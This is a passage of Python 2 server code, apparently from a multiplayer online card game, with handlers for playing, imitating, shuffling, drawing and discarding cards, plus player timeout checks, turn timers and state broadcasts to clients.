										break
							if location != None:
								break
						if selected_card != None:
							#we attempt to play this card.
							self.controller = MoveCardServerController(self)
							self.controller.selected_card = selected_card
							self.controller.selected_card_location = location
							self.server.sendall("ALERT:draw_card_from_hand")
							self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:Click on the grid where you want to play this card.")
						else:
							self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:Whatthe-...that card's not even on the table!")
				else:
					self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:It's not your turn, you can't move cards right now!")
			else:
				self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:You can't move a card, the game hasn't started...")
			return True
		return False
	def _rm_imitate_card(self, message, key, player):
		if message.startswith("IMITATE_CARD:"):
			#we play the selected card.
			if self.game_started:
				if self.players.index(player) == self.current_players_turn:
					#we check if this card is in the player's hand.
					try:
						i = int(message[len("IMITATE_CARD:"):])
						works = True
					except:
						works = False
					if works:
						location = None
						selected_card = None
						for y in xrange(self.card_table.size[1]):
							for x in xrange(self.card_table.size[0]):
								card = self.card_table.pony_cards[y][x]
								if card != None:
									if self.master_deck.cards.index(card) == i:
										location = ("pony",x,y)
										selected_card = card
										break
							if location != None:
								break
						if location != None:
							if "Changeling" in selected_card.keywords:
								if self.current_players_turn != None:
									deck = Deck.Deck()
									for card in self.master_deck.cards:
										if card.type == "pony":
											if "Changeling" not in card.keywords and selected_card.race == card.race:
												deck.add_card_to_bottom(card)
									player = self.players[self.current_players_turn]
									deck.sort()
									self.send_card_selection_player(player,deck)
								self.controller = ImitateCardServerController(self)
								self.controller.selected_card = selected_card
								self.controller.selected_card_location = location
								self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:Pick which card you'd like to imitate.")
							else:
								self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:This card can't imitate.")
						else:
							self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:Whatthe-...")
					else:
						print "ERROR! Couldn't find card with this id."
				else:
					self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:It's not your turn, you can't make card's imitate right now!")
			else:
				self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:You can't make card's imitate, the game hasn't started...")
			return True
		return False
	def _rm_cancel_action(self, message, key, player):
		if message == "CANCEL_ACTION":
			if self.game_started:
				if self.players.index(player) == self.current_players_turn:
					if self.controller != None:
						self.controller.cleanup()
						self.controller = None
						self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:This action has been cancelled.")
			return True
		return False
	def _rm_shuffle_pony_deck(self, message, key, player):
		if message == "SHUFFLE_PONY_DECK":
			if self.game_started:
				if self.players.index(player) == self.current_players_turn:
					self.history.take_snapshot(SNAPSHOT_SHUFFLE_PONY_DECK, player.name+" shuffled the Pony deck.")
					self.send_full_history_all()
					self.pony_deck.shuffle()
					self.server.sendall("ALERT:shuffle_deck")
					if self.controller != None:
						self.controller.cleanup()
						self.controller = None
				else:
					self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:You can't shuffle the Pony deck, it's not your turn!")
			else:
				self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:You can't shuffle the Pony deck, the game hasn't started yet!")
			return True
		return False
	def _rm_shuffle_ship_deck(self, message, key, player):
		if message == "SHUFFLE_SHIP_DECK":
			if self.game_started:
				if self.players.index(player) == self.current_players_turn:
					self.history.take_snapshot(SNAPSHOT_SHUFFLE_SHIP_DECK, player.name+" shuffled the Ship deck.")
					self.send_full_history_all()
					self.ship_deck.shuffle()
					self.server.sendall("ALERT:shuffle_deck")
					if self.controller != None:
						self.controller.cleanup()
						self.controller = None
				else:
					self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:You can't shuffle the Ship deck, it's not your turn!")
			else:
				self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:You can't shuffle the Ship deck, the game hasn't started yet!")
			return True
		return False
	def _rm_shuffle_goal_deck(self, message, key, player):
		if message == "SHUFFLE_GOAL_DECK":
			if self.game_started:
				if self.players.index(player) == self.current_players_turn:
					self.history.take_snapshot(SNAPSHOT_SHUFFLE_GOAL_DECK, player.name+" shuffled the Goal deck.")
					self.send_full_history_all()
					self.goal_deck.shuffle()
					self.server.sendall("ALERT:shuffle_deck")
					if self.controller != None:
						self.controller.cleanup()
						self.controller = None
				else:
					self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:You can't shuffle the Goal deck, it's not your turn!")
			else:
				self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:You can't shuffle the Goal deck, the game hasn't started yet!")
			return True
		return False
	def _rm_shuffle_pony_discard(self, message, key, player):
		if message == "SHUFFLE_PONY_DISCARD":
			if self.game_started:
				if self.players.index(player) == self.current_players_turn:
					self.history.take_snapshot(SNAPSHOT_SHUFFLE_PONY_DISCARD, player.name+" shuffled the Pony discard pile.")
					self.send_full_history_all()
					self.pony_discard.shuffle()
					self.send_decks_all()
					self.server.sendall("ALERT:shuffle_deck")
					if self.controller != None:
						self.controller.cleanup()
						self.controller = None
				else:
					self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:You can't shuffle the Pony discard pile, it's not your turn!")
			else:
				self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:You can't shuffle the Pony discard pile, the game hasn't started yet!")
			return True
		return False
	def _rm_shuffle_ship_discard(self, message, key, player):
		if message == "SHUFFLE_SHIP_DISCARD":
			if self.game_started:
				if self.players.index(player) == self.current_players_turn:
					self.history.take_snapshot(SNAPSHOT_SHUFFLE_SHIP_DISCARD, player.name+" shuffled the Ship discard pile.")
					self.send_full_history_all()
					self.ship_discard.shuffle()
					self.send_decks_all()
					self.server.sendall("ALERT:shuffle_deck")
					if self.controller != None:
						self.controller.cleanup()
						self.controller = None
				else:
					self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:You can't shuffle the Ship discard pile, it's not your turn!")
			else:
				self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:You can't shuffle the Ship discard pile, the game hasn't started yet!")
			return True
		return False
	def _rm_discard_goal(self, message, key, player):
		if message.startswith("DISCARD_GOAL:"):
			#we play the selected card.
			if self.game_started:
				if self.players.index(player) == self.current_players_turn:
					#we check if this card is in the player's hand.
					try:
						i = int(message[len("DISCARD_GOAL:"):])
						works = True
					except:
						works = False
					if works:
						selected_card = None
						for card in self.public_goals.cards:
							if self.master_deck.cards.index(card) == i:
								selected_card = card
								break
						if selected_card != None:
							#we attempt to replace with this card.
							new_goal = self.goal_deck.cards[0]
							self.history.take_snapshot(SNAPSHOT_NULL, player.name+" discarded the goal '"+selected_card.name+"'.")
							self.send_full_history_all()
							self.server.sendall("ALERT:draw_card_from_table")
							self.public_goals.remove_card(selected_card)
							self.server.sendall("ALERT:remove_deck")
							self.server.sendall("ALERT:add_card_to_deck")
							self.goal_deck.add_card_to_bottom(selected_card)
							self.send_decks_all()
							self.send_public_goals_all()
						else:
							self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:Whatthe-...")
					else:
						print "ERROR! Couldn't find card with this id."
				else:
					self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:It's not your turn, you can't discard a goal!")
			else:
				self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:You can't discard a goal, the game hasn't started...")
			return True
		return False
	def _rm_draw_goal(self, message, key, player):
		if message == "DRAW_GOAL":
			if self.game_started:
				if self.players.index(player) == self.current_players_turn:
					if len(self.goal_deck.cards) > 0:
						self.history.take_snapshot(SNAPSHOT_NULL, player.name+" drew a Goal card.")
						self.send_full_history_all()
						self.server.sendall("ALERT:draw_card_from_deck")
						self.server.sendall("ALERT:add_card_to_table")
						card = self.goal_deck.draw()
						self.public_goals.add_card_to_top(card)
						self.send_decks_all()
						self.send_public_goals_all()
					else:
						self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:There are no Goal cards to draw...")
				else:
					self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:It's not your turn, you can't draw a Goal card right now!")
			else:
				self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:You can't draw a Goal card, the game hasn't started...")
			return True
		return False
	def _rm_draw_1_discard(self, message, key, player):
		if message.startswith("DRAW_1_DISCARD:"):
			if self.game_started:
				if self.players.index(player) == self.current_players_turn:
					s = message[len("DRAW_1_DISCARD:"):]
					if s == "pony":
						if len(self.pony_discard.cards) > 0:
							self.history.take_snapshot(SNAPSHOT_DREW_PONY_CARD, player.name+" drew the Pony card '"+self.pony_discard.cards[-1].name+"' from the top of the discard pile.")
							self.send_full_history_all()
							self.server.sendall("ALERT:draw_card_from_deck")
							self.server.sendall("ALERT:add_card_to_hand")
							card = self.pony_discard.draw()
							player.hand.add_card_to_top(card)
							self.send_decks_all()
							self.send_playerhand(player)
						else:
							self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:There are no Pony cards to draw...")
					elif s == "ship":
						if len(self.ship_discard.cards) > 0:
							self.history.take_snapshot(SNAPSHOT_DREW_SHIP_CARD, player.name+" drew the Ship card '"+self.ship_discard.cards[-1].name+"' from the top of the discard pile.")
							self.send_full_history_all()
							self.server.sendall("ALERT:draw_card_from_deck")
							self.server.sendall("ALERT:add_card_to_hand")
							card = self.ship_discard.draw()
							player.hand.add_card_to_top(card)
							self.send_decks_all()
							self.send_playerhand(player)
						else:
							self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:There are no Ship cards to draw...")
					else:
						self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:You can't draw that type of card!")
				else:
					self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:It's not your turn, you can't draw a card right now!")
			else:
				self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:You can't draw a card, the game hasn't started...")
			return True
		return False
	def _rm_draw_from_discards(self, message, key, player):
		if message == "DRAW_FROM_DISCARDS":
			#we play the selected card.
			if self.game_started:
				if self.players.index(player) == self.current_players_turn:
					if self.current_players_turn != None:
						deck = Deck.Deck()
						for card in self.pony_discard.cards:
							deck.add_card_to_bottom(card)
						for card in self.ship_discard.cards:
							deck.add_card_to_bottom(card)
						player = self.players[self.current_players_turn]
						deck.sort()
						self.send_card_selection_player(player,deck)
					self.controller = DrawFromDiscardsServerController(self)
					self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:Pick which card you'd like to draw.")
				else:
					self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:It's not your turn, you can't draw a discarded card right now!")
			else:
				self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:You can't draw a discarded card right now, the game hasn't started...")
			return True
		return False
	def _rm_swap_pony_decks(self, message, key, player):
		if message == "SWAP_PONY_DECKS":
			#we play the selected card.
			if self.game_started:
				if self.players.index(player) == self.current_players_turn:
					#we attempt to swap with this card.
					self.history.take_snapshot(SNAPSHOT_NULL, player.name+" swapped the Pony decks.")
					self.send_full_history_all()
					self.server.sendall("ALERT:remove_deck")
					self.pony_deck.cards,self.pony_discard.cards = (self.pony_discard.cards, self.pony_deck.cards)
					self.server.sendall("ALERT:place_deck")
					self.send_decks_all()
				else:
					self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:It's not your turn, you can't swap the Pony decks right now!")
			else:
				self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:You can't swap the Pony decks, the game hasn't started...")
			return True
		return False
	def _rm_swap_ship_decks(self, message, key, player):
		if message == "SWAP_SHIP_DECKS":
			#we play the selected card.
			if self.game_started:
				if self.players.index(player) == self.current_players_turn:
					#we attempt to swap with this card.
					self.history.take_snapshot(SNAPSHOT_NULL, player.name+" swapped the Ship decks.")
					self.send_full_history_all()
					self.server.sendall("ALERT:remove_deck")
					self.ship_deck.cards,self.ship_discard.cards = (self.ship_discard.cards, self.ship_deck.cards)
					self.server.sendall("ALERT:place_deck")
					self.send_decks_all()
				else:
					self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:It's not your turn, you can't swap the Pony decks right now!")
			else:
				self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:You can't swap the Pony decks, the game hasn't started...")
			return True
		return False

	#Other Stuff
	def _check_player_status(self):
		# This function is to check that players are still connected, otherwise it kicks them after no response.
		t = time.time()
		i = len(self.players)-1
		while i >= 0:
			player = self.players[i]
			pa = player.address
			pn = player.name
			if player.is_connected:
				kick_em = False
				# First we check if the player is even still in the server's client listing.
				if pa in self.server.clients:
					#Next we check when we last received a message from that client.
					try:
						lgm = self.server.client_last_got_message[pa]
						dif = t - lgm
						if dif >= PING_FREQUENCY:
							if not player.is_pinged:
								player.is_pinged = True
								self.server.sendto(pa,PING_MESSAGE)
							else:
								# This means the player was already sent a 'ping', and we're waiting for a 'pong'
								if dif >= PING_FREQUENCY + TIMEOUT_TIME:
									#This player has timed out, so we must kick them.
									print "= Client '"+pn+"' has timed-out from '"+pa+"'"
									kick_em = True
						else:
							# This player is likely still connected.
							player.is_pinged = False
					except:
						print "= FAILED TO CHECK ON AND/OR PING PLAYER '"+pn+"' AT '"+pa+"'"
				else:
					print "= Client '"+pn+"' has disconnected from '"+pa+"'"
					kick_em = True
				if kick_em:
					print "= Player '"+pn+"' has been kicked."
					self.server.kick(pa)
					player.is_connected = False
					player.is_ready = False
					player.time_of_disconnect = time.time()
					self.server.sendall("ADD_CHAT:SERVER:"+"Player '"+player.name+"' has lost connection.")
					if self.controller != None:
						self.controller.triggerPlayerDisconnect(player)
					self.send_playerlist_all()
					self.check_ready()
			else:
				if player.is_spectating or not self.game_started or t - player.time_of_disconnect >= 120:
					for card in player.hand.cards:
						self.kicked_players_cards.add_card_to_top(card)
					active_player = False
					index = self.players.index(player)
					if self.game_started and index == self.current_players_turn:
						active_player = True
					if self.current_players_turn >= index:
						self.current_players_turn -= 1
					self.server.sendall("ADD_CHAT:SERVER:"+"Player '"+player.name+"' has been removed from the game.")
					del self.players[i]
					if active_player:
						self.nextPlayersTurn()
					self.send_playerlist_all()
					self.check_ready()
			i -= 1
	def check_ready(self):
		if not self.game_started:
			number_ready = 0
			for player in self.players:
				if player.is_connected and player.is_ready and not player.is_spectating:
					number_ready += 1

			ready = number_ready >= MIN_PLAYERS

			if ready and not self.timer_running:
				self.runTimer()
				self.server.sendall("ADD_CHAT:SERVER:The game will start in "+str(SERVER_GAMESTART_DELAY)+" seconds.")
			elif not ready and self.timer_running:
				self.stopTimer()
				self.server.sendall("ADD_CHAT:SERVER:...Aborted.")
		else:
			ready = 0
			count = 0
			for pl in self.players:
				if pl.is_ready:
					ready += 1
				if not pl.is_spectating:
					count += 1
			if count < MIN_PLAYERS or ready == count:
				self.reset()

		#basic throttle control
		throttle = True
		for pl in self.players:
			if pl.is_connected:
				throttle = False
				break
		self.throttled = throttle
		self.server.throttled = throttle

	def setPlayersTurn(self, i):
		#Here we put kicked players' cards into the discard piles.
		updateDecks = len(self.kicked_players_cards.cards) > 0
		for card in self.kicked_players_cards.cards:
			if card.type == "pony":
				self.pony_discard.add_card_to_bottom(card)
			elif card.type == "ship":
				self.ship_discard.add_card_to_bottom(card)
		if updateDecks:
			self.send_decks_all()
		self.kicked_players_cards = Deck.Deck()
		if self.game_started:
			count = 0
			for pl in self.players:
				if not pl.is_spectating:
					count += 1
			if count >= MIN_PLAYERS:
				self.current_players_turn = i
				self.server.sendto(self.players[i].address, "YOUR_TURN")
				self.send_playerlist_all()
				self.stopTimer()
				self.setTimerDuration(SERVER_TURN_START_DURATION)
				self.runTimer()
				self.history.clear()
				self.history.take_snapshot(SNAPSHOT_TURN_START, self.players[i].name+"'s turn has started.")
				self.send_full_history_all()
				self.controller = None
			else:
				self.current_players_turn = None
	def nextPlayersTurn(self):
		self.reset_modified_cards()
		update_goals = False
		while len(self.public_goals.cards) < 3 and len(self.goal_deck.cards) > 0:
			self.public_goals.add_card_to_top(self.goal_deck.draw())
			update_goals = True
		if update_goals: self.send_public_goals_all()
		i = self.current_players_turn
		while True:
			i += 1
			i %= len(self.players)
			if not self.players[i].is_spectating:
				break
		self.setPlayersTurn(i)
	def get_decks_transmit(self):
		s = "DECKS:"
		s += str(len(self.pony_deck.cards))+","
		s += str(len(self.ship_deck.cards))+","
		s += str(len(self.goal_deck.cards))+","
		s += str(len(self.pony_discard.cards))+","
		s += str(len(self.ship_discard.cards))+":"
		if len(self.pony_discard.cards) > 0:
			s += str(self.master_deck.cards.index(self.pony_discard.cards[0])) + ","
		else:
			s += "N,"
		if len(self.ship_discard.cards) > 0:
			s += str(self.master_deck.cards.index(self.ship_discard.cards[0]))
		else:
			s += "N"
		return s
	def check_for_modified_cards(self):
		for card in self.master_deck.cards:
			if card.must_transmit_modifications:
				card.must_transmit_modifications = False
				self.server.sendall(card.get_modified_transmit(self.master_deck))
	def check_for_cards_to_be_discarded(self):
		#TODO: Finish check_for_cards_to_be_discarded function.
		pass
	def reset_modified_cards(self):
		for card in self.master_deck.cards:
			if card.is_modified:
				card.reset()
				if card.must_transmit_modifications:
					card.must_transmit_modifications = False
					self.server.sendall(card.get_modified_transmit(self.master_deck))

	#Timer Stuff
	def setTimerDuration(self, amount):
		self.timer_start_amount = amount
	def runTimer(self):
		#Resets and runs the timer.
		if not self.timer_running:
			self.timer_running = True
			self.timer_start_time = time.time()
			self.timer_amount = float(self.timer_start_amount)
	def stopTimer(self):
		#Stops and resets the timer.
		if self.timer_running:
			self.timer_running = False
			self.timer_amount = float(self.timer_start_amount)
	def pauseTimer(self):
		if self.timer_running:
			self.timer_running = False
	def resumeTimer(self):
		if not self.timer_running:
			self.timer_running = True
			self.timer_start_time = time.time() - (self.timer_start_time - self.timer_amount)

	#Triggers
	def triggerTimerTick(self, amount):
		#called when the timer ticks 1 second down.
		if self.controller != None:
			self.controller.triggerTimerTick(amount)

		#if not self.game_started:
		#	self.server.sendall("ADD_CHAT:SERVER:..."+str(amount)+"...")
		#else:
		if self.game_started:
			if floorint(self.timer_amount) == SERVER_TURN_ALERT_DURATION:
				self.server.sendto(self.players[self.current_players_turn].address, "TURN_ALMOST_OVER")
	def triggerTimerDone(self):
		#called when the timer runs out of time.
		if self.controller != None:
			self.controller.triggerTimerDone()
			self.controller.cleanup()
			self.controller = None

		if not self.game_started:
			#This must be the game start timer, so we start the game.
			for pl in self.players:
				pl.is_ready = False
			self.game_started = True
			self.send_playerlist_all()
			import libs.ServerControllers.SetupNewgameServerController as SetupNewgameServerController
			self.controller = SetupNewgameServerController.SetupNewgameServerController(self)
		else:
			#This means a player ran out of time for their turn.
			self.server.sendall("ADD_CHAT:SERVER:"+self.players[self.current_players_turn].name+" ran out of time.")
			self.nextPlayersTurn()

	#Send Commands
	def send_playerlist_all(self):
		parts = []
		i = 0
		while i < len(self.players):
			player = self.players[i]
			part = ""
			if i == self.current_players_turn:
				part += "CT:"
			if not player.is_connected:
				part += "DC:"
			if player.is_ready:
				part += "R:"
			elif player.is_spectating:#not self.game_started:
				part += "NR:"
			if player.is_admin:
				part += "ADMIN:"
			if player.is_dev:
				part += "DEV:"
			if not player.is_loaded:
				part += "L:"
			part += player.name
			if self.game_started and not player.is_spectating:
				part += " - " + str(player.get_score())
			parts.append(part)
			i += 1
		i = 0
		while i < len(self.players):
			s = "PLAYERLIST:"
			j = 0
			while j < len(self.players):
				part = parts[j]
				if j == i:
					part = "YOU:"+str(part)
				s += part
				if j < len(self.players) - 1:
					s += ","
				j += 1
			self.server.sendto(self.players[i].address, s)
			i += 1
	def send_public_goals_all(self):
		self.server.sendall("PUBLICGOALS:"+self.public_goals.get_transmit(self.master_deck))
	def send_public_goals(self, player):
		self.server.sendto(player.address, "PUBLICGOALS:"+self.public_goals.get_transmit(self.master_deck))
	def send_playerhand(self, player):
		player.hand.sort()
		self.server.sendto(player.address, "PLAYERHAND:"+player.hand.get_transmit(self.master_deck))
	def send_cardtable_player(self, player):
		self.server.sendto(player.address, "CARDTABLE:"+self.card_table.get_transmit(self.master_deck))
	def send_cardtable_all(self):
		self.server.sendall("CARDTABLE:"+self.card_table.get_transmit(self.master_deck))
	def send_decks_all(self):
		self.server.sendall(self.get_decks_transmit())
	def send_decks_player(self, player):
		self.server.sendto(player.address, self.get_decks_transmit())
	def send_timer_all(self):
		self.server.sendall("TIMER:"+str(ceilint(self.timer_amount)))
	def send_timer_player(self, player):
		self.server.sendto(player.address, "TIMER:"+str(ceilint(self.timer_amount)))
	def send_full_history_all(self):
		history = self.history.get_full_transmit()
		self.server.sendall(history)
	def send_full_history_player(self, player):
		history = self.history.get_full_transmit()
		self.server.sendto(player.address, history)
	def send_modified_cards_player(self, player):
		for card in self.master_deck.cards:
			if card.is_modified:
				self.server.sendto(player.address,card.get_modified_transmit(self.master_deck))
	def send_card_selection_player(self, player, deck):
		self.server.sendto(player.address,"CARDSELECTION:"+deck.get_transmit(self.master_deck))

	def give_fullupdate(self, player):
		self.send_playerhand(player)
		self.send_public_goals(player)
		self.send_cardtable_player(player)
		self.send_timer_player(player)
		self.send_decks_player(player)
		self.send_full_history_player(player)
		self.send_modified_cards_player(player)
